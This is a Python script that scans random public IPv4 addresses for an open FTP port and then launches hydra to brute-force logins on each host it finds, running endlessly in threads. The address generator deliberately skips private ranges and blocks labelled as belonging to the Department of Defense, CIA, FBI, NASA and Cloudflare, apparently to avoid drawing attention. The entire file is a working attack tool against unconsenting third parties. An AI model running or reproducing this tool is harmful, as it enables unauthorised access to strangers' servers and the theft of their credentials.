import random
import socket
from colorama import Fore, init
import os
import threading
import time
import datetime

amount = '0'

init()

Fore.LR = Fore.LIGHTRED_EX
Fore.LG = Fore.LIGHTGREEN_EX
Fore.W = Fore.LIGHTWHITE_EX
PORTS = [21]


def main():
    print('''
           +-------------Welcome!------------+
           |  119 101 108 99 111 109 101 33  |
           | .-- . .-.. -.-. --- -- . .-.-.- | 
           | 167 145 154 143 157 155 145 041 | 
           +---------------------------------+ 
    ''')


def get_ipv4():
    while True:
        max = 255
        ip1 = random.randint(0, max)
        ip2 = random.randint(0, max)
        ip3 = random.randint(0, max)
        ip4 = random.randint(0, max)
        if ip1 == 127:
            continue
        if ip1 == 0:
            continue
        # Cloudflare DNS
        if ip1 == 1:
            continue
        # End of Cloudflare DNS
        if ip1 == 3:
            continue
        if ip1 == 15:
            continue
        if ip1 == 56:
            continue
        if ip1 == 10:
            continue
        if ip1 == 25:
            continue
        if ip1 == 49:
            continue
        if ip1 == 50:
            continue
        if ip1 == 137:
            continue
        # Department of Defense
        if ip1 == 6:
            continue
        if ip1 == 7:
            continue
        if ip1 == 11:
            continue
        if ip1 == 21:
            continue
        if ip1 == 22:
            continue
        if ip1 == 26:
            continue
        if ip1 == 28:
            continue
        if ip1 == 29:
            continue
        if ip1 == 30:
            continue
        if ip1 == 33:
            continue
        if ip1 == 55:
            continue
        if ip1 == 214:
            continue
        if ip1 == 215:
            continue
        # End of Department of Defense
        if ip1 == 192 and ip2 == 168:
            continue
        if ip1 == 146 and ip2 == 17:
            continue
        if ip1 == 146 and ip2 == 80:
            continue
        if ip1 == 146 and ip2 == 98:
            continue
        if ip1 == 146 and ip2 == 154:
            continue
        if ip1 == 147 and ip2 == 159:
            continue
        if ip1 == 148 and ip2 == 114:
            continue
        if ip1 == 150 and ip2 == 125:
            continue
        if ip1 == 150 and ip2 == 133:
            continue
        if ip1 == 150 and ip2 == 144:
            continue
        if ip1 == 150 and ip2 == 149:
            continue
        if ip1 == 150 and ip2 == 157:
            continue
        if ip1 == 150 and ip2 == 184:
            continue
        if ip1 == 150 and ip2 == 190:
            continue
        if ip1 == 150 and ip2 == 196:
            continue
        if ip1 == 152 and ip2 == 82:
            continue
        if ip1 == 152 and ip2 == 229:
            continue
        if ip1 == 157 and ip2 == 202:
            continue
        if ip1 == 157 and ip2 == 217:
            continue
        if ip1 == 161 and ip2 == 124:
            continue
        if ip1 == 162 and ip2 == 32:
            continue
        if ip1 == 155 and ip2 == 96:
            continue
        if ip1 == 155 and ip2 == 149:
            continue
        if ip1 == 155 and ip2 == 155:
            continue
        if ip1 == 155 and ip2 == 178:
            continue
        if ip1 == 164 and ip2 == 158:
            continue
        if ip1 == 156 and ip2 == 9:
            continue
        if ip1 == 167 and ip2 == 44:
            continue
        if ip1 == 168 and ip2 == 68:
            continue
        if ip1 == 168 and ip2 == 85:
            continue
        if ip1 == 168 and ip2 == 102:
            continue
        if ip1 == 203 and ip2 == 59:
            continue
        if ip1 == 204 and ip2 == 34:
            continue
        if ip1 == 207 and ip2 == 30:
            continue
        if ip1 == 117 and ip2 == 55:
            continue
        if ip1 == 117 and ip2 == 56:
            continue
        if ip1 == 80 and ip2 == 235:
            continue
        if ip1 == 207 and ip2 == 120:
            continue
        if ip1 == 209 and ip2 == 35:
            continue
        if ip1 == 64 and ip2 == 70:
            continue
        if ip1 == 172 and ip2 >= 16 and ip2 < 32:
            continue
        if ip1 == 100 and ip2 >= 64 and ip2 < 127:
            continue
        if ip1 == 169 and ip2 > 254:
            continue
        if ip1 == 198 and ip2 >= 18 and ip2 < 20:
            continue
        if ip1 == 64 and ip2 >= 69 and ip2 < 227:
            continue
        if ip1 == 128 and ip2 >= 35 and ip2 < 237:
            continue
        if ip1 == 129 and ip2 >= 22 and ip2 < 255:
            continue
        if ip1 == 130 and ip2 >= 40 and ip2 < 168:
            continue
        if ip1 == 131 and ip2 >= 3 and ip2 < 251:
            continue
        if ip1 == 132 and ip2 >= 3 and ip2 < 251:
            continue
        if ip1 == 134 and ip2 >= 5 and ip2 < 235:
            continue
        if ip1 == 136 and ip2 >= 177 and ip2 < 223:
            continue
        if ip1 == 138 and ip2 >= 13 and ip2 < 194:
            continue
        if ip1 == 139 and ip2 >= 31 and ip2 < 143:
            continue
        if ip1 == 140 and ip2 >= 1 and ip2 < 203:
            continue
        if ip1 == 143 and ip2 >= 45 and ip2 < 233:
            continue
        if ip1 == 144 and ip2 >= 99 and ip2 < 253:
            continue
        if ip1 == 146 and ip2 >= 165 and ip2 < 166:
            continue
        if ip1 == 147 and ip2 >= 35 and ip2 < 43:
            continue
        if ip1 == 147 and ip2 >= 103 and ip2 < 105:
            continue
        if ip1 == 147 and ip2 >= 168 and ip2 < 170:
            continue
        if ip1 == 147 and ip2 >= 198 and ip2 < 200:
            continue
        if ip1 == 147 and ip2 >= 238 and ip2 < 255:
            continue
        if ip1 == 150 and ip2 >= 113 and ip2 < 115:
            continue
        if ip1 == 152 and ip2 >= 151 and ip2 < 155:
            continue
        if ip1 == 153 and ip2 >= 21 and ip2 < 32:
            continue
        if ip1 == 155 and ip2 >= 5 and ip2 < 10:
            continue
        if ip1 == 155 and ip2 >= 74 and ip2 < 89:
            continue
        if ip1 == 155 and ip2 >= 213 and ip2 < 222:
            continue
        if ip1 == 157 and ip2 >= 150 and ip2 < 154:
            continue
        if ip1 == 158 and ip2 >= 1 and ip2 < 21:
            continue
        if ip1 == 158 and ip2 >= 235 and ip2 < 247:
            continue
        if ip1 == 159 and ip2 >= 120 and ip2 < 121:
            continue
        if ip1 == 160 and ip2 >= 132 and ip2 < 151:
            continue
        if ip1 == 64 and ip2 >= 224 and ip2 < 227:
            continue
        # CIA
        if ip1 == 162 and ip2 >= 45 and ip2 < 47:
            continue
        # NASA Kennedy Space Center
        if ip1 == 163 and ip2 >= 205 and ip2 < 207:
            continue
        if ip1 == 164 and ip2 >= 45 and ip2 < 50:
            continue
        if ip1 == 164 and ip2 >= 217 and ip2 < 233:
            continue
        # FBI controlled Linux servers & IPs/IP-Ranges
        if ip1 == 207 and ip2 >= 60 and ip2 < 62:
            continue
        # Cloudflare
        if ip1 == 104 and ip2 >= 16 and ip2 < 31:
            continue
        if ip1 == 193 and ip2 == 164:
            continue
        if ip1 == 120 and ip2 >= 103 and ip2 < 108:
            continue
        if ip1 == 188 and ip2 == 68:
            continue
        if ip1 == 78 and ip2 == 46:
            continue
        if ip1 >= 224:
            continue
        if (ip1 == 178 and ip2 == 128) or (ip1 == 123 and ip2 == 59):
            continue
        elif (ip1 == 124 and ip2 == 244) or (ip1 == 178 and ip2 == 254) or (ip1 == 185 and ip2 == 168) or (ip1 == 178 and ip2 == 79):
            continue
        ip = str(ip1) + '.' + str(ip2) + '.' + str(ip3) + '.' + str(ip4)
        return ip


def hack(IP):
    try:
        for x in PORTS:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)  # If host does not react after 3 seconds, it closes
            result = s.connect_ex((IP, x))
            if result == 0:
                if x == 21:
                    proto = 'ftp'
                elif x == 22:
                    proto = 'ssh'
                elif x == 3389:
                    proto = 'rdp'
                elif x == 23:
                    proto = 'telnet'
                elif x == 5900:
                    proto = 'vnc'
                print(f' [{datetime.time}] <--scan--> Port {x} is {Fore.LG}open{Fore.W} on{Fore.LG} {IP}{Fore.W}')
                s.close()
                os.system(f'hydra -L usernames.txt -P passwords.txt -I -V -t 4 -K {IP} {proto}')
            else:
                    print(f' [{datetime.time}] <--scan--> Port {x} is {Fore.LR}closed{Fore.W} on{Fore.LR} {IP}{Fore.W}')
                    s.close()
        s.close()
    except Exception as ex:
        print(ex)
        pass


Unlim = True
if Unlim:
    try:
        while Unlim:
            IP = get_ipv4()
            scanThread = threading.Thread(target=hack, args=(IP,), daemon=True)  # Starts the scanning thread
            time.sleep(0.05)
            scanThread.start()
    except KeyboardInterrupt:
        print(f'cacneled :c{Fore.W}')


if __name__ == "__main__":
    hack(IP)

